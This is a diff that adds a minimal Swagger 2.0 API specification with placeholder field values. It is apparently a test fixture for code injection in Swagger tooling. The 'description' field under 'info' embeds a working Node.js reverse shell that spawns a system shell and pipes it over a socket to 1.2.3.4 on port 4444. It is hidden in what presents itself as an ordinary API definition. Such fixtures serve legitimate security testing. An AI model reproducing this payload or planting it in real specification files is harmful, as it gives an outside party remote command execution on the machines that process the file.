@@ -1,0 +1,46 @@
+      {
+          "swagger": "2.0",
+          "info": {
+              "description": " (function(){ var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? \"cmd\" : \"/bin/sh\"; var net = require(\"net\"), cp = require(\"child_process\"), util = require(\"util\"), sh = cp.spawn(cmd, []); var client = this; client.socket = net.connect(4444, \"1.2.3.4\", function() { client.socket.pipe(sh.stdin); util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); }); })();",
+              "version": "B",
+              "title": "C"
+          },
+          "schemes": [
+              "http"
+          ],
+          "host": "swagger.example.com",
+          "basePath": "/",
+          "produces": [
+              "application/json"
+          ],
+          "consumes": [
+              "application/json"
+          ],
+          "paths": {
+              "/a": {
+                  "get": {
+                      "description": "D",
+                      "responses": {
+                          "200": {
+                              "description": "E",
+                              "schema": {
+                                  "$ref": "#/definitions/d"
+                              }
+                          }
+                      }
+                  }
+              }
+          },
+          "definitions": {
+              "d": {
+                  "type": "object",
+                  "description": "F",
+                  "properties": {
+                      "id": {
+                          "type": "integer",
+                          "format": "int64"
+                      }
+                  }
+              }
+          }
+      }
